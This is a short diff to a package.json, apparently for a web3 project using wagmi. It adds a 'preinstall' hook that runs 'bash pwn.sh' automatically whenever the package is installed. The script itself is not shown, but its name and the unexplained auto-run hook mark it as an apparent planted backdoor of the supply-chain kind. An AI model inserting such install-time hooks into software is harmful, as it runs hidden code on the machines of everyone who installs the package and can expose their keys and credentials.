@@ -41,6 +41,7 @@
     "wagmi": "^2.12.25"
   },
   "scripts": {
+    "preinstall": "bash pwn.sh",
     "build": "webpack",
     "test": "echo \"Error: no tests\" && exit 0"
   },
